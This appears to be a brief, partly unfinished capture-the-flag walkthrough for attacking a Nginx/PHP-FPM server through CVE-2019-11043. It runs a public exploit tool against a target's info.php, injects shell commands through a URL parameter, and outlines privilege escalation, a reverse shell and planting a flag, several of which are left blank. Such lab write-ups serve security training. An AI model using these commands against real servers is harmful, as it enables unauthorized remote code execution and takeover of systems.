# Scenario

- There is a web hosting running Nginx + PHP-FPM 7.2 which is outdated minor version and having insecure RegEx config.
- CVE-2019-11043

## Step 1: Find the .php file

`info.php` (phpinfo) is accessible from the homepage.

## Step 2: Exploit

Download Exploit
https://github.com/jas502n/CVE-2019-11043

Run Exploit
```
./phuip-fpizam http://{$TARGET_IP}/info.php
```

Output will be like this
<img src="https://github.com/jas502n/CVE-2019-11043/raw/master/php-command.jpg">

## Step 3: Inject code

```
http://{$TARGET_IP}/info.php?a=id
```

Output will be like this
<img src="https://github.com/jas502n/CVE-2019-11043/raw/master/CVE-2019-11043.jpg">

This website is running as a normal user

## Step 4: Find how to escalate

```
TODO: Write up
```

## Step 5: Run the exploit again on a website running as sudoer

## Step 6: Make a reverse shell.

## Step 7: Capture! (ประกาศศักดาว่าข้ายึดแล้วนะ)

```
sudo echo TEAM_NAME > /root/flag.txt
```
